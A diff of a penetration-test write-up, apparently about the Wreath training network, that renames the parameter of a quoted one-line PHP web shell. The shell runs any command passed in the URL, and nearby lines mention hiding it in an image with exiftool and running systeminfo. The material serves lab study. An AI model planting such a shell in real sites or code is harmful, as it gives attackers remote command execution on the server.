@@ -232,7 +232,7 @@ Eg :
 
 ```
 <?php
-    $cmd = $_GET["mrjokar"];
+    $cmd = $_GET["frost"];
     if(isset($cmd)){
         echo "<pre>" . shell_exec($cmd) . "</pre>";
     }
@@ -249,5 +249,8 @@ After exiftool to embed the payload into the image, uploading it and navigating 
 `systeminfo`:
 
 ![image](https://github.com/HattMobb/Wreath-Network-Pen-Test/assets/134090089/f8f2434a-de84-439d-a920-fc1e39b90a92)
+
+
+## Personal Pc Exploitation
 
 
